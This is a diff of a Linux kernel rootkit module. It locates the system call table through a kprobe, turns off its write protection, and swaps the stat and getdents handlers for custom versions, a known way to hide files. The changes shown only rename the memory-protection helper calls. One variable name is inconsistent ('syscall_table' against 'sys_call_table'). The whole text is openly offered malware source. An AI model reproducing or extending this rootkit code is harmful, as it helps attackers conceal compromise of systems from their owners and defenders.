@@ -19,7 +19,7 @@ static int __init entry_rootkit(void){
 
     register_kprobe(&kp);
     syscall_table = kp.addr;
-    set_addr_rw((unsigned long) sys_call_table);
+    unprotect_memory((unsigned long) sys_call_table);
 
     old_stat = (void*) sys_call_table[__NR_stat];
 	old_getdents = (void*) sys_call_table[__NR_getdents];
@@ -27,19 +27,19 @@ static int __init entry_rootkit(void){
     sys_call_table[__NR_stat] = (unsigned long) new_stat;
 	sys_call_table[__NR_getdents] = (unsigned long) new_getdents;
 
-    set_addr_ro((unsigned long) sys_call_table);
+    protect_memory((unsigned long) sys_call_table);
     
     return 0;
 }
 
 static void __exit exit_rootkit(void){
-    set_addr_rw((unsigned long) sys_call_table);
+    unprotect_memory((unsigned long) sys_call_table);
     
     sys_call_table[__NR_stat] = (unsigned long) old_stat;
     
 	sys_call_table[__NR_getdents] = (unsigned long) old_getdents;
 
-    set_addr_ro((unsigned long) sys_call_table);
+    protect_memory((unsigned long) sys_call_table);
     unregister_kprobe(&kp);
 }
 
